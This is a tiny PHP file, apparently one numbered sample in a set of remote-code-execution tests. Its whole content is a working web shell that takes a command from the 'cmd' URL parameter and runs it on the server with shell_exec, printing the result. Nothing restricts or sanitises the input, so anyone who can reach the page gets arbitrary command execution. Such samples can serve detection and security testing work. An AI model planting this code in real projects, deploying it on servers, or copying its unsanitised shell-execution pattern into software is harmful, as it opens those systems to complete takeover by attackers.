<?php
// RCE test variation #1044
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>